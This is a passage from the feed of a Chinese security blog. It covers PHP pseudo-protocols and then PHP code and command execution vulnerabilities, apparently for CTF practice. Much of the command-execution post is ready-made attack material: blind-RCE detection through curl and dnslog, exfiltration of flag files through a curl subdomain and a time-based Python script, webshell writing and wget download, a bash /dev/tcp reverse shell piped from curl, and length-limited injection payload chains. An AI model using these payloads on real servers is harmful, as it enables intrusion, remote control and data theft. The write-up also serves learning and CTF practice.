</code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><h4 id="1-php-filter"><a href="#1-php-filter" class="headerlink" title="1.php://filter"></a>1.php://filter</h4><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。</p><p>对于php://来说，是支持多种过滤器嵌套的</p><pre class="line-numbers language-groovy" data-language="groovy"><code class="language-groovy">php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/[read|write]=[过滤器1]|[过滤器2]/</span>resource<span class="token operator">=</span>文件名称（包含后缀名）#如果<span class="token operator">|</span>被过滤掉了，可以使用多过滤器<span class="token punctuation">:</span>php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/string.rot13/</span>resource<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token string regex">//</span>filter<span class="token string regex">/convert.base64-encode/</span>resource<span class="token operator">=</span>文件名称（包含后缀名）嵌套过程的执行流程为从左到右<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其实是可以简写成这样的<code>php://filter/[过滤器]</code> ，php会自己进行识别。</p><p>过滤器列表:</p><table><thead><tr><th>过滤器名称</th><th>说明</th><th>类别</th><th>版本</th></tr></thead><tbody><tr><td>string.rot13</td><td>rot13转换</td><td>字符串过滤器</td><td>PHP&gt;4.3.0</td></tr><tr><td>string.toupper、string.tolower</td><td>大小写互转</td><td>字符串过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.base64-encode、convert.base64-decode</td><td>base64编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.quoted-printable-encode、convert.quoted-printable-decode</td><td>URL编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>convert.iconv.编码1.编码2</td><td>任意编码转换</td><td>转换过滤器</td><td>PHP&gt;5.0.0</td></tr><tr><td>zlib.deflate、zlib.inflate</td><td>zlib压缩</td><td>压缩过滤器</td><td>PHP&gt;5.1.0</td></tr><tr><td>bzip2.compress、bzip2.decompress</td><td>zlib压缩</td><td>压缩过滤器</td><td>PHP&gt;5.1.0</td></tr></tbody></table><h2 id="6-PHP伪协议常用函数"><a href="#6-PHP伪协议常用函数" class="headerlink" title="6.PHP伪协议常用函数"></a>6.PHP伪协议常用函数</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><blockquote><p><a href="https://blog.csdn.net/qq_42181428/article/details/87090539">https://blog.csdn.net/qq_42181428/article/details/87090539</a></p><p><a href="https://blog.csdn.net/bmth666/article/details/104616201">https://blog.csdn.net/bmth666/article/details/104616201</a></p><p><a href="https://www.anquanke.com/post/id/231407#h3-6">https://www.anquanke.com/post/id/231407#h3-6</a></p><p><a href="https://www.cnblogs.com/jzking121/p/15144416.html">https://www.cnblogs.com/jzking121/p/15144416.html</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430">https://blog.csdn.net/qq_42181428/article/details/87090539?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_aggregation-2-87090539.pc_agg_rank_aggregation&amp;utm_term=ctf+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&amp;spm=1000.2123.3001.4430</a></p><p><a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="网络安全" scheme="https://h3h3qaq.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码执行漏洞</title>
    <link href="https://h3h3qaq.github.io/posts/12a5c357.html"/>
    <id>https://h3h3qaq.github.io/posts/12a5c357.html</id>
    <published>2021-11-10T13:35:22.000Z</published>
    <updated>2021-11-10T14:51:35.877Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="代码命令执行函数"><a href="#代码命令执行函数" class="headerlink" title="代码命令执行函数"></a>代码命令执行函数</h1><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><table><thead><tr><th>函数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>${php代码}</td><td></td><td>${phpinfo};</td></tr><tr><td>mixed eval(string $code)</td><td>把字符串code作为php代码执行</td><td>eval(‘phpinfo();’);</td></tr><tr><td>bool assert(mixed $assertion [, string $description])</td><td>assert()会检查指定的assertion并在结果为FALSE时采取适当的相应。如果assertion是字符串，它将会被assert()当作PHP代码来执行</td><td>assert(‘system(“whoami”)’);</td></tr><tr><td>mixed preg_replace(mixde $patterm,mixed $replacement,mixed $subject [, int $limit =-1 [, int&amp;$count]])</td><td>搜索subject中匹配pattern的部分，以replacement进行替换。当$pattern处存在e修饰符是(5.5.0版本/e修饰符已经被弃用了)，$replacement会被当做php代码执行</td><td>preg_replace(“/test/e”,”system(‘whoami’)”,’test’);</td></tr><tr><td>mixed call_user_func(callable $callback [, mixed $paramenter [, mixed $..]])</td><td>第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。传入<code>call_user_func()</code>的参数不能为引用传递</td><td>call_user_func(‘system’,’whoami’);</td></tr><tr><td>mixed call_user_func_array(callable $callback,arry $param_arr)</td><td>把第一个参数作为回调函数（callback）调用，把参数数组(param_arr)作为回调函数的参数传入</td><td>call_user_func_array(‘system’,array(‘whoami’));</td></tr><tr><td>string creat)function( string $args,string $code)</td><td>在php中使用<code>creat_function()</code>创建一个匿名函数(lambda-style)，如果对参数为进行严格的过滤审查，攻击者可以通过提交特殊字符串给creat_function()从而导致任意代码执行</td><td>creat_function(‘$test’,’};phpinfo();/*’);</td></tr><tr><td>array array_map(callable $callback ,array $array1 [, array $…])</td><td>为数组的每个元素应用回调函数。其返回值为数组，是为array1每个元素应用callback函数之后的数组。callback函数形参的数量和传给array_map()数组数量，两者必须一样。</td><td>array_map(‘system’,array(‘whoami’));</td></tr><tr><td>array array_filter (array $array [, callable $callback [, int $flag=0]])</td><td>依次将array数组中的每个值传递到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保持不变</td><td>array_filter(array(‘whoami’),’system’);</td></tr><tr><td>bool usort( array &amp;$array,callabe $value_compare_func)</td><td>通过用户自定义的比较函数对数组进行排序</td><td>$a=array(‘whoami’,’t’);usort($a,”system”);</td></tr><tr><td>bool uasort(array &amp;$array, callable $value_compare_func)</td><td>使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</td><td>$a=array(‘whoami’,’t’);uasort($a,”system”);</td></tr></tbody></table><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><table><thead><tr><th>函数</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>string system( string $command [, int &amp;$return_var] )</td><td>command是要执行的命令。如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中，显示输出</td><td>system(‘whoami’);</td></tr><tr><td>void passthru ( string $command [, int &amp;$return_var])</td><td>执行外部程序并且显示原始输出</td><td>passthru(‘whoami’);</td></tr><tr><td>void pcntl_exec(string $path [, arry $args [, array $envs]] )</td><td>path是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本args是一个要传递给程序的参数的字符串数组。该模块不能在非Unix平台（Windows）上运行</td><td>pcntl_exec(“/bin/cat/etc/passwd”,”r”);$read=fread($handle,2096);echo $read;pclose($handle);</td></tr><tr><td>string exec (string $command [, array &amp;$output [, int &amp;$return_bar]])</td><td>执行所指定的命令，并返回结果的最后一行内容，不显示输出</td><td>echo exec(‘whoami’);</td></tr><tr><td>string shell_exec(string $cmd)</td><td>通过shell环境执行命令，并且将完整的输出以字符串的方式返回</td><td>echo shell_exec(‘whoami’);</td></tr><tr><td>resource popen(string $command,string $mode)</td><td>打开一个指向进程的管道，该进程该进程由派生给定的command命令执行而产生。后面的mode，当为’r’，返回的文件指针等于命令的STDOUT，当为’w’，返回的文件指针等于命令的STDIN</td><td>$handle = popen(“bin/cat/etc/passwd”,”r”);$read=fread($handle,2096);echo $read;pclose($handle);</td></tr><tr><td>反引号                                                                                                       echo <code>whoami</code>;(md语法问题)</td><td></td><td></td></tr></tbody></table><h1 id="无回显命令执行"><a href="#无回显命令执行" class="headerlink" title="无回显命令执行"></a>无回显命令执行</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该环境为一个无回显的命令执行</p><p>所以我们需要判断命令是否执行成功</p><p>以下方式可以判断是否成功RCE</p><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><pre class="line-numbers language-none"><code class="language-none">1. 延迟?cmd=sleep 3通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行2.HTTP请求(1).在公网服务器监听端口nc -lvp port(2).向目标服务器发起http请求，执行curl命令?cmd=curl ip:port如果向目标服务器发起htpp请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞3.DNS请求dnslog?cmd=ping 9y8y3k.dnslog.cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><pre class="line-numbers language-none"><code class="language-none">1.使用 &gt;或&gt;&gt;?cmd=cat flag.php &gt; flag.txt2.mv或cp?cmd=mc flag.php flag.txt?cmd=cp flag.php flag.txt3.打包压缩(1).tar打包或tar打包并压缩tar cvf flag.tar flag.phptar zcvf flag.tar.gz flag.php(2).zip压缩zip flag.zip flat.php4.cut and sleepsed指定读取文件的第几行cat flag.php|sed -n '2p'提取每一行的第三个字节cut -b 3 flag文件最后cat flag.php|sed -n '2p'|cut -b 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span><span class="token string">""</span>flag<span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data<span class="token operator">=</span><span class="token string">"a%3D`cat flag.php|sed -n '2p'|cut -b {}`;[$a %3D \"{}\"] %26%26 sleep2"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        start_time<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>data<span class="token punctuation">)</span>        spend_time<span class="token operator">=</span>end_time <span class="token operator">-</span>start_time        <span class="token keyword">if</span> spend_time<span class="token operator">&gt;=</span><span class="token number">2</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><h4 id="直接写入"><a href="#直接写入" class="headerlink" title="直接写入"></a>直接写入</h4><pre class="line-numbers language-none"><code class="language-none">?cmd = echo "&lt;?php @eval(\$_POST[h3]);?&gt;"&gt;webshell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="外部下载"><a href="#外部下载" class="headerlink" title="外部下载"></a>外部下载</h4><pre class="line-numbers language-none"><code class="language-none">wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Dnslog"><a href="#Dnslog" class="headerlink" title="Dnslog"></a>Dnslog</h4><p>1.命令执行时要避免空格，空格会导致空格后面的命令执行不到；</p><p>2.将读取的文件命令用反引号``包括起来；</p><p>3.拼劲的域名又长度限制</p><p>用<code>&lt;</code>替换读取文件中的空格，且对输出结果base64编码</p><pre class="line-numbers language-none"><code class="language-none">curl `cat&lt;flag.php|base64`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拼接域名（最终构造结果）</p><pre class="line-numbers language-none"><code class="language-none">curl `cat&lt;flag.php|base64`.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>1.首先在公网服务器用nc指令监听端口</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp port <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 2.然后在公网服务器上写一个文件（qwzf文件）</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp;/dev/tcp/ip/poat 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.在浏览器执行</p><pre class="line-numbers language-none"><code class="language-none">?cmd=curl ip:port/qwzf|bush<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="有限字符的命令执行"><a href="#有限字符的命令执行" class="headerlink" title="有限字符的命令执行"></a>有限字符的命令执行</h1><p>##14位可控</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"too long~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然只能传入14个字符</p><p>但是并没有限制命令执行次数</p><p>所以我们可以通过Linux下的<code>&gt;</code>符号与<code>&gt;&gt;</code>符号写入一段webshell到指定文件。</p><pre class="line-numbers language-none"><code class="language-none">echo \&lt;?php&gt;1echo eval\(&gt;&gt;1echo \$_GET&gt;&gt;1echo \[1\]&gt;&gt;1echo \)\;&gt;&gt;1mv 1 1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地起环境</p><p><img src="https://i.loli.net/2021/11/10/gioqP6AWsOr8nfH.png" alt="image-20210827105450559"></p><p>经测试 这种换号的php文件也可以运行</p><p><img src="https://i.loli.net/2021/11/10/kbWTq5M8s2LfNl6.png" alt="image-20210827105828450"></p><p>写入后蚁剑连接靶机</p><p><img src="https://i.loli.net/2021/11/10/EZS3ieU1pF562qG.png" alt="image-20210827104518584"></p><p>拿到flag</p><h2 id="7位可控"><a href="#7位可控" class="headerlink" title="7位可控"></a>7位可控</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;hr/&gt;'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"too long~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>小知识点</p><pre class="line-numbers language-none"><code class="language-none">&gt;a #虽然没有输出但是会创建a这个文件ls -s #ls基于事件排序（从晚到早）sh a #sh会把a里面的每行内容当作命令来执行使用\进行命令拼接 #l\s=ls base64 #使用base64编码避免特殊字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目标写入一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php eval($_GET[1]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64编码后</p><pre class="line-numbers language-none"><code class="language-none">PD9waHAgZXZhbCgkX0dFVFsxXSk7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们需要执行</p><pre class="line-numbers language-none"><code class="language-none">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&gt;hp&gt;1.p\\&gt;d\&gt;\\&gt;\ -\\&gt;e64\\&gt;bas\\&gt;7\|\\&gt;XSk\\&gt;Fsx\\&gt;dFV\\&gt;kX0\\&gt;bCg\\&gt;XZh\\&gt;Agz\\&gt;waH\\&gt;PD9\\&gt;o\ \\&gt;ech\\ls -t&gt;0sh 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/11/10/zRTA25W31q7GFoD.png" alt="image-20210827112202097"></p><h2 id="5位可控"><a href="#5位可控" class="headerlink" title="5位可控"></a>5位可控</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$sandbox</span><span class="token operator">=</span><span class="token single-quoted-string string">'/var/www/html/sandbox'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"orange"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SERVER</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">exec</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/bin/rm -rf'</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>知识点：</p><pre class="line-numbers language-none"><code class="language-none">1.输入通配符* ,Linux会把第一个列出的文件名当做命令,剩下的文件名当作参数2.通过rev来倒置输出内容(rev命令将文件中的每行内容以字符为单位反序输出)3.用dir来代替ls不换行输出;rev将文件内容反向输出;在用ls是,写到a时每个文件名都是单独一行&gt;revecho '1233'&gt;v*v (等同于命令:rev v)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们需要把</p><pre class="line-numbers language-none"><code class="language-none">echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拆分然后执行</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&gt;dir&gt;f\&gt;&gt;ht-&gt;sl*&gt;v&gt;rev*v&gt;a&gt;hp&gt;p\\&gt;1.\\&gt;\&gt;\\&gt;-d\\&gt;\\\&gt;64\\&gt;se\\&gt;ba\\&gt;\|\\&gt;7\\&gt;Sk\\&gt;X\\&gt;x\\&gt;Fs\\&gt;FV\\&gt;d\\&gt;X0\\&gt;k\\&gt;g\\&gt;bC\\&gt;h\\&gt;XZ\\&gt;gZ\\&gt;A\\&gt;aH\\&gt;w\\&gt;D9\\&gt;P\\&gt;S}\\&gt;IF\\&gt;{\\&gt;\$\\&gt;o\\&gt;ch\\&gt;e\\sh ash f <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="无字母shell"><a href="#无字母shell" class="headerlink" title="无字母shell"></a>无字母shell</h1><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>有的时候会遇到这样的情况：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[a-z0-9]'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'h3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>h3<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了数字和字母</p><p>这里们可以用到异或</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"."</span><span class="token operator">^</span><span class="token double-quoted-string string">"~"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出结果为：</p><pre class="line-numbers language-none"><code class="language-none">P<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PHP中，两个变量进行异或的时候，会先将把字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。</p><h2 id="取反"><a href="#取反" class="headerlink" 